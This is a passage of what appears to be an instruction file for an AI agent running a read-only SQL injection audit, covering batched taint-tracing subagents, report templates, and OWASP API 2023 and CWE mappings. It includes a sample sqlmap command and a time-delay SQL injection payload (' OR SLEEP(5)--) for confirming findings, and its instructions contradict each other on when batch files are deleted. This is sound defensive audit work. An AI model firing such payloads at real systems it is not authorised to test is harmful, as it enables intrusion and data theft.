2. Divide them into batches of up to 3. For example, 8 sites → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those site sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sites.
5. Each subagent writes to `{{ REPORTS_ROOT }}/02_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. For example, if the project uses Node.js with `pg`, include the "Node.js — pg (PostgreSQL)" and related Node examples. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned vulnerable SQL construction site, determine whether a user-supplied value reaches the interpolated variable. Our goal is to find SQL injection vulnerabilities. Write results to `{{ REPORTS_ROOT }}/02_batch_[N].md`.
>
> **Your assigned construction sites** (from the recon phase):
>
> [Paste the full text of the assigned site sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand request entry points, middleware, and how data flows through the application.
>
> **SQLi reference — trace the interpolated variable(s) backwards to their origin**:
>
> 1. **Direct user input** — the variable is assigned directly from a request source with no transformation:
>    - HTTP query params: `request.GET.get(...)`, `req.query.x`, `params[:x]`, `$_GET['x']`, `c.Query("x")`
>    - Path parameters: `request.path_params['id']`, `req.params.id`, `params[:id]`
>    - Request body / form fields: `request.POST.get(...)`, `req.body.x`, `params[:x]`, `$_POST['x']`
>    - HTTP headers: `request.headers.get(...)`, `req.headers['x']`
>    - Cookies: `request.COOKIES.get(...)`, `req.cookies.x`
>    - GraphQL arguments: `args.x`, `env.getArgument("x")`
>
> 2. **Indirect user input** — the variable is derived from user input through transformations, function calls, or intermediate assignments. Trace the full chain:
>    - Variable assigned from a function return value → check that function's parameter origin
>    - Variable passed as a function argument → check the call site(s)
>    - Variable read from a class attribute or shared state set elsewhere → find the setter
>    - Variable conditionally assigned — check all branches
>
> 3. **Second-order input** — the variable is read from the database, but the stored value originally came from user input:
>    - Find where this value was written to the DB — was it stored from a user-supplied field?
>    - Was it sanitized or parameterized at write time?
>
> 4. **Third-party API input** — the variable comes from data pulled from an integrated API:
>    - Map to **API10:2023 Unsafe Consumption of APIs**.
>
> 5. **Server-side / hardcoded value** — the variable comes from config, an environment variable, a hardcoded constant, or server-side logic with no user influence — this site is NOT exploitable.
>
> **Mitigations** (check even if user input might reach the variable):
> - Allowlist validation before use (especially for dynamic identifiers — column/table names, `ORDER BY`)
> - Type casts that genuinely constrain the value in context (e.g., `int(val)` in purely numeric SQL fragments)
> - Custom escaping (`mysql_real_escape_string`, `addslashes`, homegrown sanitizers) is **not** equivalent to parameterization — still classify as Likely Vulnerable if taint is present
>
> **Vulnerable vs. Secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Vulnerable**: User input demonstrably reaches the interpolated variable with no effective mitigation.
> - **Likely Vulnerable**: User input probably reaches the variable (indirect flow) or only weak mitigation (custom escaping) is present.
> - **Not Vulnerable**: The variable is server-side only, OR effective parameterization / allowlist validation is in place.
> - **Needs Manual Review**: Cannot determine the variable's origin with confidence (opaque helpers, complex flows, external libraries).
>
> **Required fields for every finding**:
> - **OWASP API 2023 root-cause risk**: choose API8:2023 Security Misconfiguration and/or API10:2023 Unsafe Consumption of APIs, and explain why.
> - **CWE**: map to the most specific CWE from the reference (e.g., CWE-89, CWE-943, CWE-20, CWE-116).
> - **Dynamic Test**: include at least one manual payload or sqlmap command appropriate to the database and injection context; include a time-delay payload when error-based confirmation is unavailable.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/02_batch_[N].md`:
>
> ```markdown
> # SQLi Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **OWASP API 2023 root-cause risk**: [API8:2023 Security Misconfiguration / API10:2023 Unsafe Consumption of APIs / both]
> - **CWE**: [CWE-89 / CWE-943 / CWE-20 / CWE-116 / ...]
> - **Issue**: [e.g., "HTTP query param `username` flows directly into f-string SELECT query"]
> - **Taint trace**: [Step-by-step from entry point to the construction site]
> - **Impact**: [What an attacker can do — extract records, bypass auth, delete data, etc.]
> - **Remediation**: [Parameterized query, ORM equivalent, or allowlist for identifiers]
> - **Dynamic Test**:
>   ```
>   [sqlmap command or manual curl payload. Show parameter, payload, expected response signal.
>    Include a time-delay payload such as ' OR SLEEP(5)-- when error-based confirmation is unavailable.
>    Example: sqlmap -u "https://app.example.com/search?q=test" -p q --dbs]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **OWASP API 2023 root-cause risk**: [API8 / API10 / both]
> - **CWE**: [CWE-89 / CWE-943 / CWE-116]
> - **Issue**: [e.g., "Indirect flow or custom escaping only"]
> - **Taint trace**: [Best-effort trace; mark uncertain steps]
> - **Concern**: [Why it remains a risk]
> - **Remediation**: [Replace with parameterized query]
> - **Dynamic Test**:
>   ```
>   [payload to attempt bypass]
>   ```
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Reason**: [e.g., "Server-side constant" or "Allowlist gates sort column"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Uncertainty**: [Why origin could not be determined]
> - **Suggestion**: [What to trace manually]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/02_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/02_sqli.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/02_batch_1.md`, `{{ REPORTS_ROOT }}/02_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary (construction sites analyzed = total sites from recon that were batched, i.e., sum of sites across batches).
4. Write the merged report to `{{ REPORTS_ROOT }}/02_sqli.md` using this format:

```markdown
# SQLi Analysis Results: [Project Name]

## Executive Summary
- Construction sites analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/02_sqli.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/02_batch_*.md`).

---

## OWASP API Security Top 10 2023 mapping

The official OWASP API Security Top 10 2023 does **not** contain a standalone "Injection" category. SQL injection in APIs should be reported through its root-cause risk.

This scan supports the following OWASP API Security Top 10 2023 risks:

| Root cause | OWASP risk | When to cross-map |
| --- | --- | --- |
| Unsafe dynamic SQL built from user input | API8:2023 Security Misconfiguration | Default/unsafe ORM settings, missing input validation, verbose SQL errors, lack of parameterized-query adoption as an organizational hardening practice. |
| Unsanitized data from a third-party API inserted into SQL | API10:2023 Unsafe Consumption of APIs | Data pulled from an integration is trusted and used in raw SQL. |
| Missing parameterized query adoption as an organizational pattern | API8:2023 Security Misconfiguration | Repeated across codebase; hardening/configuration failure. |

**API8:2023 — Security Misconfiguration**
- *Description*: APIs and the systems supporting them typically contain complex configurations. Software and DevOps engineers can miss these configurations, or don't follow security best practices when it comes to configuration, opening the door for different types of attacks.
- *Relevance to SQLi*: Choosing ORM raw/unsafe methods, disabling prepared statements, enabling verbose SQL errors, or failing to validate dynamic identifiers are all configuration/hardening failures that allow injection.
- *Official prevention*: A repeatable hardening process, continuous configuration assessment, and restricting incoming content types/data formats.

**API10:2023 — Unsafe Consumption of APIs**
- *Description*: Developers tend to trust data received from third-party APIs more than user input, and so tend to adopt weaker security standards. In order to compromise APIs, attackers go after integrated third-party services instead of trying to compromise the target API directly.
- *Relevance to SQLi*: A third-party API may return attacker-controlled values (e.g., a malicious business name or repository name) that are later inserted into raw SQL by the target API.
- *Official prevention*: Always validate and properly sanitize data received from integrated APIs before using it.

Each finding in `{{ REPORTS_ROOT }}/02_sqli.md` must include an **OWASP API 2023 root-cause risk** field explaining which risk(s) the finding represents.

---

## CWE references

Map findings to the CWE taxonomy when the root cause is clear:

- **CWE-89**: Improper Neutralization of Special Elements in SQL Command ('SQL Injection') — use for classic concatenation/interpolation into SQL.
- **CWE-564**: SQL Injection: Hibernate — use when Hibernate/JPA native or HQL queries are built dynamically.
- **CWE-943**: Improper Neutralization of Special Elements in Data Query Logic — use for NoSQL injection, Elasticsearch/Lucene injection, DynamoDB expression injection, and other non-SQL query-language injections.
- **CWE-20**: Improper Input Validation — when input validation is missing entirely or when dynamic identifiers lack allowlist validation.
- **CWE-116**: Improper Encoding or Escaping of Output — when manual escaping is used instead of parameterization (custom sanitizer, `addslashes`, `mysql_real_escape_string`, etc.).
- **CWE-74**: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') — use as a broader parent mapping when multiple downstream injection channels exist.
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') — do **not** use for SQLi; only map here if the SQLi vector also leads to command execution and that is the primary finding.

When a single finding involves multiple weaknesses (e.g., missing validation plus unsafe concatenation), list the most specific SQLi CWE first, followed by supporting CWEs.

---

## Important Reminders

- Read `{{ REPORTS_ROOT }}/01_architecture.md` and pass its content to all subagents as context.
- **This is a read-only audit.** Do not modify project source code, configuration files, test data, or any other project file. Subagents must only read and report.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 construction sites per subagent**. If there are 1-3 sites total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned sites' text from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is purely structural**: flag any dynamic variable embedded in a SQL query string, regardless of origin. Do not trace user input in Phase 1 — that is Phase 2's job.
- **Phase 2 is purely taint analysis**: for each assigned site, trace the interpolated variable back to its origin. If it comes from a user-controlled source, the site is a real vulnerability.
- Focus on **raw SQL and ORM raw/unsafe methods**. Standard ORM query builder calls (`.filter()`, `.where(col: val)`, `.find()`) are safe by default — do not flag them.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
- Taint can flow indirectly: a request parameter may be extracted in a middleware, stored in a shared object, passed through several helper functions, and finally reach the query construction. Trace the full chain.
- Custom escaping (including `mysql_real_escape_string`, `addslashes`, or homegrown sanitizers) is **not** equivalent to parameterization — flag as Likely Vulnerable even if escaping is present.
- For dynamic identifiers (column/table names), parameterization cannot help — the only safe fix is allowlist validation. Flag any dynamic identifier without an allowlist, regardless of whether it appears user-controlled.
- Second-order injection is easy to miss: a value stored in the DB from user input may later be read and used unsafely in a raw query elsewhere in the codebase. In Phase 2, treat DB-read values as potentially tainted and trace back to where they were written.
- Third-party API data is also tainted: values received from external integrations can carry SQLi payloads and should be treated like user input when they reach SQL.
- Preserve intermediate files (`{{ REPORTS_ROOT }}/02_recon.md` and all `{{ REPORTS_ROOT }}/02_batch_*.md`) until the final consolidated report (`{{ REPORTS_ROOT }}/report.md`) has been written. Delete them only after `references/99-report.md` has finished and the orchestrator confirms no further reads are needed.
- Clean up intermediate files: delete `{{ REPORTS_ROOT }}/02_recon.md` and all `{{ REPORTS_ROOT }}/02_batch_*.md` files after the final `{{ REPORTS_ROOT }}/report.md` is written.

---

## References

- OWASP API Security Top 10 2023 — [API8:2023 Security Misconfiguration](0xa8-security-misconfiguration.md)
- OWASP API Security Top 10 2023 — [API10:2023 Unsafe Consumption of APIs](0xaa-unsafe-consumption-of-apis.md)
- OWASP Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- OWASP SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- CWE-89 — https://cwe.mitre.org/data/definitions/89.html
- CWE-564 — https://cwe.mitre.org/data/definitions/564.html
- CWE-943 — https://cwe.mitre.org/data/definitions/943.html
- CWE-20 — https://cwe.mitre.org/data/definitions/20.html
- CWE-116 — https://cwe.mitre.org/data/definitions/116.html
